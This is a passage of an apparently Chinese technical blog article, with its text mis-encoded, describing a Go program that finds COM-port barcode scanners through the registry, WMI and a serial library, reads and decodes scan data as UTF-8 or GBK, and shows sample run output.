<p>æœ¬é¡¹ç›®åŸºäºGolangè¯­è¨€å¼€å‘ï¼Œå®ç°äº†è‡ªåŠ¨æ£€æµ‹ã€åŠ è½½COMç«¯å£æ‰«ç æªè®¾å¤‡ï¼Œå¹¶å¯¹æ‰«ç æ•°æ®è¿›è¡Œè¯»å–ã€è§£ç å’Œå¤„ç†çš„åŠŸèƒ½ã€‚è¯¥ç¨‹åºæ”¯æŒå¤šç§ä¸²å£æ£€æµ‹æ–¹å¼ï¼Œè‡ªåŠ¨è¯†åˆ«ä¸åŒç¼–ç æ ¼å¼çš„æ¡ç æ•°æ®ï¼Œå¹¶æä¾›äº†é«˜æ•ˆçš„å¹¶å‘å¤„ç†æœºåˆ¶ã€‚</p>
<h4 data-id="heading-2">1.1 ä¸»è¦åŠŸèƒ½ç‰¹ç‚¹</h4>
<ul>
<li>è‡ªåŠ¨æ‰«æå¹¶è¯†åˆ«ç³»ç»Ÿä¸­çš„COMç«¯å£è®¾å¤‡</li>
<li>æ”¯æŒä¸‰ç§ä¸²å£æ£€æµ‹æ–¹å¼ï¼šç¬¬ä¸‰æ–¹åº“ã€Windowsæ³¨å†Œè¡¨ã€WMI</li>
<li>è‡ªåŠ¨è¯†åˆ«æ‰«ç æªè®¾å¤‡ï¼ˆæ”¯æŒYJ4600å’ŒNLDC M9å‹å·ï¼‰</li>
<li>æ”¯æŒUTF-8å’ŒGBKç¼–ç æ ¼å¼çš„è‡ªåŠ¨æ£€æµ‹ä¸è½¬æ¢</li>
<li>é‡‡ç”¨åç¨‹å®ç°é«˜æ•ˆçš„æ‰«ç æ•°æ®å¹¶å‘å¤„ç†</li>
<li>æ”¯æŒæ‰«ç æ•°æ®çš„JSONè§£æä¸ç»“æ„ä½“è½¬æ¢</li>
</ul>
<h3 data-id="heading-3">2. æŠ€æœ¯æ ˆä¸ä¾èµ–</h3>
<h4 data-id="heading-4">2.1 æ ¸å¿ƒç¼–ç¨‹è¯­è¨€</h4>
<ul>
<li>Golang 1.2.24.0</li>
</ul>
<h4 data-id="heading-5">2.2 ä¸»è¦ä¾èµ–åº“</h4>

































<table><thead><tr><th>ä¾èµ–åº“</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td><code>github.com/go-ole/go-ole</code></td><td>Windows COMæ¥å£æ“ä½œï¼Œç”¨äºWMIæŸ¥è¯¢</td></tr><tr><td><code>github.com/go-ole/go-ole/oleutil</code></td><td>OLEè‡ªåŠ¨åŒ–å·¥å…·åº“</td></tr><tr><td><code>github.com/tarm/goserial</code></td><td>ä¸²å£é€šä¿¡æ“ä½œ</td></tr><tr><td><code>go.bug.st/serial</code></td><td>ç¬¬ä¸‰æ–¹ä¸²å£æ£€æµ‹åº“</td></tr><tr><td><code>golang.org/x/sys/windows/registry</code></td><td>Windowsæ³¨å†Œè¡¨æ“ä½œ</td></tr><tr><td><code>golang.org/x/text/encoding/simplifiedchinese</code></td><td>ä¸­æ–‡ç¼–ç è½¬æ¢</td></tr></tbody></table>
<h3 data-id="heading-6">3. ç³»ç»Ÿæ¶æ„ä¸æ ¸å¿ƒæ¨¡å—</h3>
<h4 data-id="heading-7">3.1 ç³»ç»Ÿæ¶æ„å›¾</h4>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     ä¸»ç¨‹åºå…¥å£                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ä¸²å£æ£€æµ‹æ¨¡å—   â”‚   ä¸²å£é€šä¿¡æ¨¡å—  â”‚   æ•°æ®å¤„ç†æ¨¡å—     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  <span class="hljs-built_in">getCommlist2</span>()â”‚   serial<span class="hljs-selector-class">.OpenPort</span>()â”‚ <span class="hljs-built_in">readBarcodeData</span>() â”‚
â”‚  <span class="hljs-built_in">getCommList</span>() â”‚   s<span class="hljs-selector-class">.Read</span>()      â”‚ <span class="hljs-built_in">resolveBarcodeData</span>() â”‚
â”‚ <span class="hljs-built_in">getCommListWmi</span>()â”‚               â”‚ <span class="hljs-built_in">codeJsonConvertStruct</span>() â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          â”‚                â”‚                â”‚
          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                           â–¼
                   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                   â”‚ ç¼–ç è½¬æ¢æ¨¡å—   â”‚
                   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
                   â”‚  <span class="hljs-built_in">GetStrCoding</span>()â”‚
                   â”‚     <span class="hljs-built_in">isUtf8</span>()   â”‚
                   â”‚     <span class="hljs-built_in">isGBK</span>()    â”‚
                   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-8">3.2 æ ¸å¿ƒæ¨¡å—è¯´æ˜</h4>
<h5 data-id="heading-9">3.2.1 ä¸²å£æ£€æµ‹æ¨¡å—</h5>
<p>è¯¥æ¨¡å—è´Ÿè´£æ£€æµ‹ç³»ç»Ÿä¸­æ‰€æœ‰å¯ç”¨çš„COMç«¯å£ï¼Œå¹¶è¯†åˆ«æ‰«ç æªè®¾å¤‡ã€‚æä¾›äº†ä¸‰ç§æ£€æµ‹æ–¹å¼ï¼š</p>
<ol>
<li>
<p><strong>ç¬¬ä¸‰æ–¹åº“æ£€æµ‹</strong> (<code>getCommlist2()</code>)</p>
<ul>
<li>ä½¿ç”¨<code>go.bug.st/serial</code>åº“ç›´æ¥è·å–ç«¯å£åˆ—è¡¨</li>
<li>å®ç°ç®€å•ï¼Œä½†å¯èƒ½æ— æ³•è¯†åˆ«è®¾å¤‡ç±»å‹</li>
</ul>
</li>
<li>
<p><strong>æ³¨å†Œè¡¨æ£€æµ‹</strong> (<code>getCommList()</code>)</p>
<ul>
<li>é€šè¿‡è¯»å–Windowsæ³¨å†Œè¡¨<code>HARDWARE\DEVICEMAP\SERIALCOMM</code>è·å–ç«¯å£ä¿¡æ¯</li>
<li>æ”¯æŒè¯†åˆ«ç‰¹å®šå‹å·çš„æ‰«ç æªï¼ˆé€šè¿‡"youjie"å…³é”®è¯ï¼‰</li>
<li>éœ€è¦ç®¡ç†å‘˜æƒé™è¿è¡Œ</li>
</ul>
</li>
<li>
<p><strong>WMIæ£€æµ‹</strong> (<code>getCommListWmi()</code>)</p>
<ul>
<li>ä½¿ç”¨Windows Management InstrumentationæŸ¥è¯¢ç¡¬ä»¶ä¿¡æ¯</li>
<li>é€šè¿‡<code>Win32_PNPEntity</code>ç±»è·å–æ‰€æœ‰å³æ’å³ç”¨è®¾å¤‡</li>
<li>æ”¯æŒè¯†åˆ«å¤šç§å‹å·çš„æ‰«ç æªï¼ˆYJ4600å’ŒNLDC M9ï¼‰</li>
<li>ä»£ç å®ç°è¾ƒä¸ºå¤æ‚ï¼Œä½†åŠŸèƒ½å¼ºå¤§</li>
</ul>
</li>
</ol>
<h5 data-id="heading-10">3.2.2 ä¸²å£é€šä¿¡æ¨¡å—</h5>
<p>è´Ÿè´£ä¸æ‰«ç æªè®¾å¤‡å»ºç«‹è¿æ¥å¹¶è¯»å–æ‰«ç æ•°æ®ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>github.com/tarm/goserial</code>åº“è¿›è¡Œä¸²å£é€šä¿¡</li>
<li>æ”¯æŒé…ç½®æ³¢ç‰¹ç‡ç­‰ä¸²å£å‚æ•°</li>
<li>å®ç°äº†æŒç»­çš„æ•°æ®è¯»å–å¾ªç¯</li>
<li>å¤„ç†è¯»å–é”™è¯¯å’Œå¼‚å¸¸æƒ…å†µ</li>
</ul>
<h5 data-id="heading-11">3.2.3 æ•°æ®å¤„ç†æ¨¡å—</h5>
<p>å¤„ç†ä»æ‰«ç æªè¯»å–åˆ°çš„æ•°æ®ï¼š</p>
<ul>
<li><code>readBarcodeData()</code>: åç¨‹å‡½æ•°ï¼ŒæŒç»­æ¥æ”¶å¹¶å¤„ç†æ‰«ç æ•°æ®</li>
<li><code>resolveBarcodeData()</code>: è§£ææ¡ç æ•°æ®ï¼Œæ”¯æŒä¸åŒæ ¼å¼çš„æ¡ç </li>
<li><code>codeJsonConvertStruct()</code>: å°†JSONæ ¼å¼çš„æ¡ç æ•°æ®è½¬æ¢ä¸ºç»“æ„ä½“</li>
</ul>
<h5 data-id="heading-12">3.2.4 ç¼–ç è½¬æ¢æ¨¡å—</h5>
<p>è‡ªåŠ¨è¯†åˆ«å’Œè½¬æ¢ä¸åŒç¼–ç æ ¼å¼çš„æ•°æ®ï¼š</p>
<ul>
<li><code>GetStrCoding()</code>: è‡ªåŠ¨æ£€æµ‹æ•°æ®ç¼–ç æ ¼å¼ï¼ˆUTF-8ã€GBKæˆ–æœªçŸ¥ï¼‰</li>
<li><code>isUtf8()</code>: UTF-8ç¼–ç æ£€æµ‹</li>
<li><code>isGBK()</code>: GBKç¼–ç æ£€æµ‹</li>
<li>æ”¯æŒUTF-8ä¸GBKç¼–ç ä¹‹é—´çš„åŒå‘è½¬æ¢</li>
</ul>
<h3 data-id="heading-13">4. æ ¸å¿ƒåŠŸèƒ½å®ç°ç»†èŠ‚</h3>
<h4 data-id="heading-14">4.1 ä¸²å£æ£€æµ‹å®ç°</h4>
<h5 data-id="heading-15">4.1.1 WMIæ£€æµ‹æ–¹å¼è¯¦è§£</h5>
<p>WMIæ£€æµ‹æ˜¯æœ€å¤æ‚ä½†åŠŸèƒ½æœ€å¼ºå¤§çš„æ£€æµ‹æ–¹å¼ï¼Œå…¶å®ç°æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>åˆå§‹åŒ–COMæ¥å£ï¼š<code>ole.CoInitialize(0)</code></li>
<li>åˆ›å»ºSWbemLocatorå¯¹è±¡ï¼š<code>oleutil.CreateObject("WbemScripting.SWbemLocator")</code></li>
<li>è·å–IDispatchæ¥å£ï¼š<code>unknown.QueryInterface(ole.IID_IDispatch)</code></li>
<li>è¿æ¥WMIæœåŠ¡ï¼š<code>oleutil.CallMethod(wmi, "ConnectServer")</code></li>
<li>æ‰§è¡ŒWMIæŸ¥è¯¢ï¼š<code>oleutil.CallMethod(service, "ExecQuery", "SELECT * FROM Win32_PNPEntity")</code></li>
<li>éå†æŸ¥è¯¢ç»“æœï¼Œç­›é€‰å‡ºCOMç«¯å£è®¾å¤‡</li>
<li>æ ¹æ®è®¾å¤‡åç§°è¯†åˆ«æ‰«ç æªå‹å·</li>
</ol>
<p>å…³é”®ä»£ç ç‰‡æ®µï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getCommListWmi</span><span class="hljs-params">()</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">string</span>) {
    <span class="hljs-comment">// åˆå§‹åŒ–COMæ¥å£</span>
    ole.CoInitialize(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">defer</span> ole.CoUninitialize()
    
    <span class="hljs-comment">// åˆ›å»ºWMIå¯¹è±¡å¹¶æ‰§è¡ŒæŸ¥è¯¢</span>
    unknown, _ := oleutil.CreateObject(<span class="hljs-string">"WbemScripting.SWbemLocator"</span>)
    <span class="hljs-keyword">defer</span> unknown.Release()
    wmi, _ := unknown.QueryInterface(ole.IID_IDispatch)
    <span class="hljs-keyword">defer</span> wmi.Release()
    
    serviceRaw, _ := oleutil.CallMethod(wmi, <span class="hljs-string">"ConnectServer"</span>)
    service := serviceRaw.ToIDispatch()
    <span class="hljs-keyword">defer</span> service.Release()
    
    resultRaw, _ := oleutil.CallMethod(service, <span class="hljs-string">"ExecQuery"</span>, <span class="hljs-string">"SELECT * FROM Win32_PNPEntity"</span>)
    result := resultRaw.ToIDispatch()
    <span class="hljs-keyword">defer</span> result.Release()
    
    <span class="hljs-comment">// éå†ç»“æœå¹¶ç­›é€‰COMç«¯å£</span>
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h4 data-id="heading-16">4.2 æ‰«ç æ•°æ®è¯»å–ä¸å¤„ç†</h4>
<h5 data-id="heading-17">4.2.1 æ•°æ®è¯»å–æœºåˆ¶</h5>
<p>ç¨‹åºé€šè¿‡æŒç»­å¾ªç¯ä»ä¸²å£è¯»å–æ•°æ®ï¼Œå¹¶å¤„ç†ä¸åŒå‹å·æ‰«ç æªçš„å‘é€ç‰¹æ€§ï¼š</p>
<ul>
<li>æ”¯æŒä¸€æ¬¡æ€§å‘é€å®Œæ•´æ•°æ®çš„æ‰«ç æªï¼ˆå¦‚YJ4600ï¼‰</li>
<li>æ”¯æŒåˆ†å¤šæ¬¡å‘é€æ•°æ®çš„æ‰«ç æªï¼ˆå¦‚NLDC M9ï¼‰</li>
<li>ä½¿ç”¨ç¼“å†²åŒºæ‹¼æ¥å®Œæ•´çš„æ‰«ç æ•°æ®</li>
</ul>
<p>å…³é”®ä»£ç ç‰‡æ®µï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// å¼€å¯ä¸€ä¸ªå¾ªç¯ï¼ŒæŒç»­è¯»å–æ‰«ç æªçš„æ•°æ®</span>
codeData := <span class="hljs-string">""</span> <span class="hljs-comment">//ç”¨äºä¿å­˜æ¯æ¬¡è¯»å–åˆ°ç¼“å†²åŒºçš„æ•°æ®</span>
<span class="hljs-keyword">for</span> {
    <span class="hljs-comment">//æ¸…ç©ºç¼“å†²åŒºçš„æ•°æ®</span>
    buf = <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">1024</span>)
    <span class="hljs-comment">//è¯»å–ç æ–‡æ•°æ®åˆ°ç¼“å†²åŒºå†…</span>
    lens, err := s.Read(buf)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        log.Println(err)
        <span class="hljs-keyword">continue</span>
    }
    
    <span class="hljs-comment">// å°†è¯»å–åˆ°çš„æ•°æ®è¿½åŠ åˆ°codeDataä¸­ï¼Œå¤„ç†åˆ†å¤šæ¬¡å‘é€çš„æƒ…å†µ</span>
    x := buf[:lens]
    codeData += <span class="hljs-type">string</span>(x)
    
    <span class="hljs-comment">// å¤„ç†å®Œæ•´çš„æ‰«ç æ•°æ®</span>
    <span class="hljs-keyword">if</span> lens &gt; <span class="hljs-number">4</span> {
        <span class="hljs-comment">// ç¼–ç è½¬æ¢å’Œå¤„ç†</span>
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<h5 data-id="heading-18">4.2.2 å¹¶å‘å¤„ç†æœºåˆ¶</h5>
<p>ç¨‹åºä½¿ç”¨Golangçš„åç¨‹ç‰¹æ€§å®ç°äº†æ‰«ç æ•°æ®çš„å¼‚æ­¥å¤„ç†ï¼š</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªé€šé“ç”¨äºä¼ é€’æ‰«ç æ•°æ®</li>
<li>å¯åŠ¨ä¸€ä¸ªåç¨‹æŒç»­ç›‘å¬é€šé“</li>
<li>ä¸»çº¿ç¨‹è¯»å–åˆ°å®Œæ•´æ•°æ®åå‘é€åˆ°é€šé“</li>
<li>åç¨‹æ¥æ”¶åˆ°æ•°æ®åè¿›è¡Œè§£æå’Œå¤„ç†</li>
</ul>
<p>å…³é”®ä»£ç ç‰‡æ®µï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// ç”¨äºæ¥æ”¶ç æ–‡çš„é€šé“</span>
receiveMessage := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)
<span class="hljs-comment">// å¼€å¯ä¸€ä¸ªåç¨‹ï¼Œä¸æ–­ä»é€šé“å†…è¯»å–æ•°æ®</span>
<span class="hljs-keyword">go</span> readBarcodeData(receiveMessage)

<span class="hljs-comment">// è¯»å–åˆ°å®Œæ•´æ•°æ®åå‘é€åˆ°é€šé“</span>
<span class="hljs-keyword">if</span> codeString != <span class="hljs-string">""</span> {
    receiveMessage &lt;- codeString
}

<span class="hljs-comment">// åç¨‹å‡½æ•°ï¼šæŒç»­è¯»å–é€šé“å†…çš„ç æ–‡æ•°æ®</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">readBarcodeData</span><span class="hljs-params">(message <span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)</span></span> {
    <span class="hljs-keyword">for</span> {
        <span class="hljs-keyword">select</span> {
        <span class="hljs-keyword">case</span> data := &lt;-message:
            fmt.Printf(<span class="hljs-string">"æ‰«ç æ—¶é—´:%v\n"</span>, time.Now().String())
            <span class="hljs-comment">//è§£æç æ–‡æ•°æ®</span>
            resolveBarcodeData(data)
        }
    }
}
</code></pre>
<h4 data-id="heading-19">4.3 ç¼–ç è¯†åˆ«ä¸è½¬æ¢</h4>
<h5 data-id="heading-20">4.3.1 ç¼–ç æ£€æµ‹ç®—æ³•</h5>
<p>ç¨‹åºå®ç°äº†UTF-8å’ŒGBKç¼–ç çš„è‡ªåŠ¨æ£€æµ‹ï¼š</p>
<ol>
<li><strong>UTF-8æ£€æµ‹</strong>ï¼šæ ¹æ®UTF-8ç¼–ç è§„åˆ™ï¼Œæ£€æŸ¥å­—èŠ‚åºåˆ—æ˜¯å¦ç¬¦åˆæ ¼å¼</li>
<li><strong>GBKæ£€æµ‹</strong>ï¼šæ£€æŸ¥åŒå­—èŠ‚æ˜¯å¦è½åœ¨GBKç¼–ç èŒƒå›´å†…</li>
<li><strong>æ£€æµ‹é¡ºåº</strong>ï¼šå…ˆæ£€æµ‹UTF-8ï¼Œå†æ£€æµ‹GBKï¼Œç¡®ä¿å‡†ç¡®æ€§</li>
</ol>
<p>å…³é”®ä»£ç ç‰‡æ®µï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetStrCoding</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> <span class="hljs-type">string</span> {
    <span class="hljs-keyword">if</span> isUtf8(data) == <span class="hljs-literal">true</span> {
        <span class="hljs-keyword">return</span> UTF8
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> isGBK(data) == <span class="hljs-literal">true</span> {
        <span class="hljs-keyword">return</span> GBK
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> UNKNOWN
    }
}
</code></pre>
<h5 data-id="heading-21">4.3.2 ç¼–ç è½¬æ¢å®ç°</h5>
<p>æ”¯æŒUTF-8ä¸GBKç¼–ç ä¹‹é—´çš„åŒå‘è½¬æ¢ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> GetStrCoding([]<span class="hljs-type">byte</span>(codeData)) == <span class="hljs-string">"UTF8"</span> {
    <span class="hljs-comment">// UTF-8è½¬GBKå†è½¬UTF-8ï¼ˆå¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼‰</span>
    gbkData, _ := simplifiedchinese.GB18030.NewEncoder().Bytes([]<span class="hljs-type">byte</span>(codeData))
    utf8Data, _ := simplifiedchinese.GB18030.NewDecoder().Bytes(gbkData)
    codeString = <span class="hljs-type">string</span>(utf8Data)
}
<span class="hljs-keyword">if</span> GetStrCoding([]<span class="hljs-type">byte</span>(codeData)) == <span class="hljs-string">"GBK"</span> {
    <span class="hljs-comment">// GBKè½¬UTF-8</span>
    b, _ := simplifiedchinese.GB18030.NewDecoder().Bytes([]<span class="hljs-type">byte</span>(codeData))
    codeString = <span class="hljs-type">string</span>(b)
}
</code></pre>
<h5 data-id="heading-22">4.3.3 è¿è¡Œæ•ˆæœ</h5>
<pre><code class="hljs language-go" lang="go">(TraeAI<span class="hljs-number">-8</span>) D:\vfptest [<span class="hljs-number">1</span>:<span class="hljs-number">1</span>] $ <span class="hljs-keyword">go</span> run  test_com.<span class="hljs-keyword">go</span>
è“ç‰™é“¾æ¥ä¸Šçš„æ ‡å‡†ä¸²è¡Œ (COM4)
è“ç‰™é“¾æ¥ä¸Šçš„æ ‡å‡†ä¸²è¡Œ (COM5)
Bluetooth Device (RFCOMM Protocol TDI)
æœ¬æœºä¸²å£åˆ—è¡¨ï¼š[è“ç‰™é“¾æ¥ä¸Šçš„æ ‡å‡†ä¸²è¡Œ (COM4) è“ç‰™é“¾æ¥ä¸Šçš„æ ‡å‡†ä¸²è¡Œ (COM5) Bluetooth Device (RFCOMM Protocol TDI)]
æ‰«ç æª:
ç«¯å£è¢«å ç”¨
<span class="hljs-number">2025</span>/<span class="hljs-number">12</span>/<span class="hljs-number">08</span> <span class="hljs-number">13</span>:<span class="hljs-number">23</span>:<span class="hljs-number">17</span> The system cannot find the path specified.
exit status <span class="hljs-number">1</span>
(TraeAI<span class="hljs-number">-8</span>) D:\vfptest [<span class="hljs-number">1</span>:<span class="hljs-number">1</span>] $ <span class="hljs-keyword">go</span> run  test_com.<span class="hljs-keyword">go</span>
YJ4600 (COM7)
strComName: YJ4600 (COM7
æœ¬æœºä¸²å£åˆ—è¡¨ï¼š[YJ4600 (COM7)]
æ‰«ç æª:COM7
-----------------------------------------------------------------------------------
--æ‰«å²—ä½è¯å¸¦ä¸­æ–‡
lens: <span class="hljs-number">6</span>
before convert: ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
codeData: ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
before convert: <span class="hljs-number">6</span>
coding: GBK
æ‰«ç æ—¶é—´:<span class="hljs-number">2025</span><span class="hljs-number">-12</span><span class="hljs-number">-08</span> <span class="hljs-number">13</span>:<span class="hljs-number">26</span>:<span class="hljs-number">26.7199849</span> +<span class="hljs-number">0800</span> CST m=+<span class="hljs-number">4.979774801</span>
------------------------
ç æ–‡: æå››â–²


---------------------------------------------------------------------------------------------

--æ‰«è¯å“åŒ…è£…æ¡ç 
------------------------
lens: <span class="hljs-number">20</span>
before convert: <span class="hljs-number">88281800136707328258</span>
codeData: <span class="hljs-number">88281800136707328258</span>
before convert: <span class="hljs-number">20</span>
coding: UTF8
after convert: <span class="hljs-number">88281800136707328258</span>
æ‰«ç æ—¶é—´:<span class="hljs-number">2025</span><span class="hljs-number">-12</span><span class="hljs-number">-08</span> <span class="hljs-number">13</span>:<span class="hljs-number">27</span>:<span class="hljs-number">05.295828</span> +<span class="hljs-number">0800</span> CST m=+<span class="hljs-number">43.555617901</span>
------------------------
ç æ–‡: <span class="hljs-number">88281800136707328258</span>

---------------------------------------------------------------------------------------------

--æ‰«å¾®ä¿¡äºŒç»´ç 
lens: <span class="hljs-number">43</span>
before convert: http:<span class="hljs-comment">//weixin.qq.com/r/9XUCGmDEOT1GrSR59yDn</span>
codeData: http:<span class="hljs-comment">//weixin.qq.com/r/9XUCGmDEOT1GrSR59yDn</span>
before convert: <span class="hljs-number">43</span>
coding: UTF8
after convert: http:<span class="hljs-comment">//weixin.qq.com/r/9XUCGmDEOT1GrSR59yDn</span>
æ‰«ç æ—¶é—´:<span class="hljs-number">2025</span><span class="hljs-number">-12</span><span class="hljs-number">-08</span> <span class="hljs-number">13</span>:<span class="hljs-number">27</span>:<span class="hljs-number">23.5772834</span> +<span class="hljs-number">0800</span> CST m=+<span class="hljs-number">61.837073301</span>
------------------------
ç æ–‡: http:<span class="hljs-comment">//weixin.qq.com/r/9XUCGmDEOT1GrSR59yDn</span>

---------------------------------------------------------------------------------------------
--æ‰«åŠæˆå“äºŒç»´ç å¸¦ä¸­æ–‡

lens: <span class="hljs-number">380</span>
before convert: D181ï¿½ï¿½<span class="hljs-number">67010</span>-ATï¿½ï¿½FD181<span class="hljs-number">-661</span><span class="hljs-number">-12</span>ï¿½ï¿½EM41ï¿½ï¿½FLRYï¿½ï¿½<span class="hljs-number">0.5</span>ï¿½ï¿½ï¿½ï¿½ï¿½Ì¡ï¿½<span class="hljs-number">690</span>ï¿½ï¿½<span class="hljs-number">300</span>ï¿½ï¿½<span class="hljs-number">15574</span>ï¿½ï¿½CC64ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">4</span>ï¿½ï¿½ï¿½ï¿½Ö¾Ç¿ï¿½ï¿½<span class="hljs-number">2016</span>/<span class="hljs-number">12</span>/<span class="hljs-number">21</span>ï¿½ï¿½Ò¹ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">50</span>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">20170102</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">4</span>ï¿½ï¿½X-F4ï¿½ï¿½<span class="hljs-number">2016.11</span><span class="hljs-number">.10</span>ï¿½ï¿½ï¿½Û±ï¿½ï¿½ï¿½<span class="hljs-number">3</span>ï¿½ï¿½<span class="hljs-number">968221</span><span class="hljs-number">-1</span>(TE)ï¿½ï¿½<span class="hljs-number">0.5</span>ï¿½ï¿½ï¿½ï¿½DJ628<span class="hljs-number">-4.8</span>ï¿½ï¿½<span class="hljs-number">0.8</span>A(ZJZ)ï¿½ï¿½<span class="hljs-number">0.5</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">3.5</span>ï¿½ï¿½TE0<span class="hljs-number">.85</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">0.05</span>mmï¿½ï¿½TE1<span class="hljs-number">.54</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">0.10</span>mmï¿½ï¿½<span class="hljs-number">4.0</span>ï¿½ï¿½ZJZ1<span class="hljs-number">.15</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">0.05</span>mmï¿½ï¿½ZJZ2<span class="hljs-number">.23</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">0.10</span>mmï¿½ï¿½<span class="hljs-number">80</span>ï¿½ï¿½<span class="hljs-number">80</span>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">0.98</span>ï¿½ï¿½<span class="hljs-number">0.25</span>ï¿½ï¿½<span class="hljs-number">0.05</span>+<span class="hljs-number">0.40</span>ï¿½ï¿½<span class="hljs-number">11</span>ï¿½ï¿½<span class="hljs-number">2</span>/<span class="hljs-number">5</span>ï¿½ï¿½<span class="hljs-number">2</span>ï¿½ï¿½<span class="hljs-number">11</span>ï¿½ï¿½<span class="hljs-number">2</span>/<span class="hljs-number">5</span>ï¿½ï¿½<span class="hljs-number">2</span>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">03</span><span class="hljs-number">-1</span><span class="hljs-number">-149</span><span class="hljs-number">-029</span>ï¿½ï¿½ï¿½ï¿½ï¿½Ç¾ï¿½ï¿½ï¿½
codeData: D181ï¿½ï¿½<span class="hljs-number">67010</span>-ATï¿½ï¿½FD181<span class="hljs-number">-661</span><span class="hljs-number">-12</span>ï¿½ï¿½EM41ï¿½ï¿½FLRYï¿½ï¿½<span class="hljs-number">0.5</span>ï¿½ï¿½ï¿½ï¿½ï¿½Ì¡ï¿½<span class="hljs-number">690</span>ï¿½ï¿½<span class="hljs-number">300</span>ï¿½ï¿½<span class="hljs-number">15574</span>ï¿½ï¿½CC64ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">4</span>ï¿½ï¿½ï¿½ï¿½Ö¾Ç¿ï¿½ï¿½<span class="hljs-number">2016</span>/<span class="hljs-number">12</span>/<span class="hljs-number">21</span>ï¿½ï¿½Ò¹ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">50</span>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">20170102</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">4</span>ï¿½ï¿½X-F4ï¿½ï¿½<span class="hljs-number">2016.11</span><span class="hljs-number">.10</span>ï¿½ï¿½ï¿½Û±ï¿½ï¿½ï¿½<span class="hljs-number">3</span>ï¿½ï¿½<span class="hljs-number">968221</span><span class="hljs-number">-1</span>(TE)ï¿½ï¿½<span class="hljs-number">0.5</span>ï¿½ï¿½ï¿½ï¿½DJ628<span class="hljs-number">-4.8</span>ï¿½ï¿½<span class="hljs-number">0.8</span>A(ZJZ)ï¿½ï¿½<span class="hljs-number">0.5</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">3.5</span>ï¿½ï¿½TE0<span class="hljs-number">.85</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">0.05</span>mmï¿½ï¿½TE1<span class="hljs-number">.54</span>ï¿½ï¿½ï¿½ï¿½<span 